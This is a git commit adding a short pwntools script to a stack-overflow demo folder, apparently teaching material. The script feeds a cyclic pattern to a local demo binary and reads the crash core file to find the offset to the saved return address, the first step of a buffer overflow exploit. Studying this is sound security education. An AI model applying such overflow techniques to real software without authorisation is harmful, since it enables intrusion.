5785368c5359cab3e0a52803fbb467e2ca558367
Ram Basnet <rambasnet@gmail.com>
2020-12-16 11:44:25 -0500

    added python exploit code

---
+++ demos/stack_overflow/find_offset.py
@@ -0,0 +1,18 @@
+#! /usr/bin/env python3
+
+from pwn import *
+
+target_program = "./so_stdio.exe"
+
+elf = ELF(target_program)
+
+p = process(target_program)
+
+# https://docs.pwntools.com/en/stable/util/cyclic.html
+# create 200 characters cyclic length
+p.sendline(cyclic(200, n=8))
+p.wait()
+
+core = p.corefile
+offset = cyclic_find(core.read(core.esp, 8), n=8)
+print(f'offset = {offset}')
